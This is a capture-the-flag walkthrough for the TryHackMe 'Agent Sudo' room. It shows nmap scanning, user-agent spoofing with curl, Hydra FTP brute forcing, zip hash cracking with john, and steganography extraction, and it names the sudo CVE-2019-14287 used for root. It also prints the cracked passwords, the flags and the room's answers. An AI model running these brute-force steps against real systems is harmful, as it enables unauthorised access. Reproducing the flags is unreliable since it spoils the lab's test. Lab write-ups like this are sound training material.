# Agent Sudo

You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

[Agent Sudo](https://tryhackme.com/room/agentsudoctf)

## Topic's

- Network Enumeration
- Web Header Manipulation
- Brute Forcing (FTP)
- Brute Forcing (Zip)
- Steganography
- Cryptography
  - Base64
- OSINT
- CVE-2019-14287 - Sudo < 1.8.28

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Author note

Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.

1. Deploy the machine

`No answer needed`

## Enumerate

Enumerate the machine and get all the important information

1. How many open ports?

```
kali@kali:~/CTFs/tryhackme/Agent Sudo$ sudo nmap -A -Pn -sC -sV -O 10.10.34.31
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 13:28 CEST
Nmap scan report for 10.10.34.31
Host is up (0.053s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/4%OT=21%CT=1%CU=35221%PV=Y%DS=2%DC=T%G=Y%TM=5F79B1F
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%TS=A)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%II=I%
OS:TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5
OS:=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=
OS:68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   36.49 ms 10.8.0.1
2   36.67 ms 10.10.34.31

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.71 seconds
```

`3`

2. How you redirect yourself to a secret page?

- [http://10.10.34.31/](http://10.10.34.31/)

```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```

`user-agent`

1. What is the agent name?

```
kali@kali:~/CTFs/tryhackme/Agent Sudo$ curl -A "C" -L 10.10.34.31
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```

`chris`

## Hash cracking and brute-force

Done enumerate the machine? Time to brute your way out.

1. FTP password

```
kali@kali:~/CTFs/tryhackme/Agent Sudo$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.34.31 ftp
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-04 13:36:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.34.31:21/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 14344243 to do in 1532:31h, 16 active
[21][ftp] host: 10.10.34.31   login: chris   password: crystal
```

2. Zip file password

```
kali@kali:~/CTFs/tryhackme/Agent Sudo$ binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

```
kali@kali:~/CTFs/tryhackme/Agent Sudo$ zip2john _cutie.png.extracted/8702.zip > zip.hash
ver 81.9 _cutie.png.extracted/8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
kali@kali:~/CTFs/tryhackme/Agent Sudo$ john zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 7 candidates buffered for the current salt, minimum 16 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:01 DONE 2/3 (2020-10-04 13:42) 0.6993g/s 37134p/s 37134c/s 37134C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

3. steg password

```
kali@kali:~/CTFs/tryhackme/Agent Sudo$ echo -n 'QXJlYTUx' | base64 -d
Area51
```

4. Who is the other agent (in full name)?

`james`

5. SSH password

```
kali@kali:~/CTFs/tryhackme/Agent Sudo$ cat message.txt
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

`hackerrules!`

## Capture the user flag

You know the drill.

1. What is the user flag?

```
james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
```

2. What is the incident of the photo called?

```
kali@kali:~/CTFs/tryhackme/Agent Sudo$ scp james@10.10.34.31:Alien_autospy.jpg ./
james@10.10.34.31's password:
Alien_autospy.jpg                                            100%   41KB 358.6KB/s   00:00
kali@kali:~/CTFs/tryhackme/Agent Sudo$
```

`roswell alien autopsy`

## Privilege escalation

Enough with the extraordinary stuff? Time to get real.

1. CVE number for the escalation (Format: CVE-xxxx-xxxx)

`CVE-2019-14287`

2. What is the root flag?

```
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

`b53a02f55b57d4439e3341834d70c062`

3. (Bonus) Who is Agent R?

`DesKel`
